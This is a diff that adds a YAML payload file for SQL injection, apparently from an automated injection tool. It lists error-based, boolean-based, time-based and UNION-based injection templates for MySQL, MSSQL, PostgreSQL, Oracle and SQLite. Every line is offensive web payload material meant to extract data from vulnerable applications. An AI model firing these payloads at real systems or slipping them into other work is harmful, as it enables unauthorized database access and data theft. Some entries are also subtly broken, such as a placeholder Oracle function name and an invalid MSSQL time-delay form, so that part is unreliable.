@@ -1,0 +1,110 @@
+databases:
+  mysql:
+    comment: "-- "
+    version_suffix: "/*!50000"
+    error_based:
+      - "AND extractvalue(1,concat(0x7e,({QUERY}),0x7e))"
+      - "AND updatexml(1,concat(0x7e,({QUERY}),0x7e),1)"
+      - "OR extractvalue(1,concat(0x7e,({QUERY}),0x7e))"
+      - "OR updatexml(1,concat(0x7e,({QUERY}),0x7e),1)"
+    boolean_based:
+      - "AND {BOOLEAN_CONDITION}"
+      - "OR {BOOLEAN_CONDITION}"
+      - "AND ({BOOLEAN_CONDITION})"
+      - "OR ({BOOLEAN_CONDITION})"
+      - "AND {BOOLEAN_CONDITION} AND 1=1"
+      - "OR {BOOLEAN_CONDITION} AND 1=1"
+    time_based:
+      - "AND IF({BOOLEAN_CONDITION}, SLEEP({SLEEP_TIME}), 0)"
+      - "OR IF({BOOLEAN_CONDITION}, SLEEP({SLEEP_TIME}), 0)"
+      - "AND (SELECT IF({BOOLEAN_CONDITION}, SLEEP({SLEEP_TIME}), 0))"
+      - "OR (SELECT IF({BOOLEAN_CONDITION}, SLEEP({SLEEP_TIME}), 0))"
+      - "AND IF({BOOLEAN_CONDITION}, BENCHMARK({SLEEP_TIME}000000, MD5('a')), 0)"
+    union_based:
+      - "UNION SELECT {COLUMNS}"
+      - "UNION ALL SELECT {COLUMNS}"
+      - "UNION SELECT NULL,{COLUMNS}"
+      - "UNION ALL SELECT NULL,{COLUMNS}"
+
+  mssql:
+    comment: "--"
+    version_suffix: ""
+    error_based:
+      - "AND convert(int,({QUERY}))"
+      - "AND 1=convert(int,({QUERY}))"
+      - "OR convert(int,({QUERY}))"
+      - "AND 1=({QUERY})"
+    boolean_based:
+      - "AND {BOOLEAN_CONDITION}"
+      - "OR {BOOLEAN_CONDITION}"
+      - "AND ({BOOLEAN_CONDITION})"
+      - "OR ({BOOLEAN_CONDITION})"
+    time_based:
+      - "AND IF({BOOLEAN_CONDITION}, WAITFOR DELAY '0:0:{SLEEP_TIME}', 0)"
+      - "OR IF({BOOLEAN_CONDITION}, WAITFOR DELAY '0:0:{SLEEP_TIME}', 0)"
+      - "AND {BOOLEAN_CONDITION} WAITFOR DELAY '0:0:{SLEEP_TIME}'"
+    union_based:
+      - "UNION SELECT {COLUMNS}"
+      - "UNION ALL SELECT {COLUMNS}"
+      - "UNION SELECT NULL,{COLUMNS}"
+      - "UNION ALL SELECT NULL,{COLUMNS}"
+
+  postgresql:
+    comment: "--"
+    version_suffix: ""
+    error_based:
+      - "AND 1=cast(({QUERY}) as int)"
+      - "AND 1=({QUERY})"
+      - "OR 1=cast(({QUERY}) as int)"
+      - "OR 1=({QUERY})"
+    boolean_based:
+      - "AND {BOOLEAN_CONDITION}"
+      - "OR {BOOLEAN_CONDITION}"
+      - "AND ({BOOLEAN_CONDITION})"
+      - "OR ({BOOLEAN_CONDITION})"
+    time_based:
+      - "AND CASE WHEN {BOOLEAN_CONDITION} THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END"
+      - "OR CASE WHEN {BOOLEAN_CONDITION} THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END"
+      - "AND CASE WHEN ({BOOLEAN_CONDITION}) THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END"
+    union_based:
+      - "UNION SELECT {COLUMNS}"
+      - "UNION ALL SELECT {COLUMNS}"
+      - "UNION SELECT NULL,{COLUMNS}"
+      - "UNION ALL SELECT NULL,{COLUMNS}"
+
+  oracle:
+    comment: "--"
+    version_suffix: ""
+    error_based:
+      - "AND 1=ctxsys.drithdsx.your_function(({QUERY}))"
+      - "AND 1=({QUERY})"
+      - "OR 1=({QUERY})"
+    boolean_based:
+      - "AND {BOOLEAN_CONDITION}"
+      - "OR {BOOLEAN_CONDITION}"
+      - "AND ({BOOLEAN_CONDITION})"
+      - "OR ({BOOLEAN_CONDITION})"
+    time_based:
+      - "AND CASE WHEN {BOOLEAN_CONDITION} THEN DBMS_LOCK.SLEEP({SLEEP_TIME}) ELSE NULL END"
+      - "OR CASE WHEN {BOOLEAN_CONDITION} THEN DBMS_LOCK.SLEEP({SLEEP_TIME}) ELSE NULL END"
+    union_based:
+      - "UNION SELECT {COLUMNS} FROM DUAL"
+      - "UNION ALL SELECT {COLUMNS} FROM DUAL"
+      - "UNION SELECT NULL,{COLUMNS} FROM DUAL"
+      - "UNION ALL SELECT NULL,{COLUMNS} FROM DUAL"
+
+  sqlite:
+    comment: "--"
+    version_suffix: ""
+    error_based: []
+    boolean_based:
+      - "AND {BOOLEAN_CONDITION}"
+      - "OR {BOOLEAN_CONDITION}"
+      - "AND ({BOOLEAN_CONDITION})"
+      - "OR ({BOOLEAN_CONDITION})"
+    time_based: []
+    union_based:
+      - "UNION SELECT {COLUMNS}"
+      - "UNION ALL SELECT {COLUMNS}"
+      - "UNION SELECT NULL,{COLUMNS}"
+      - "UNION ALL SELECT NULL,{COLUMNS}"
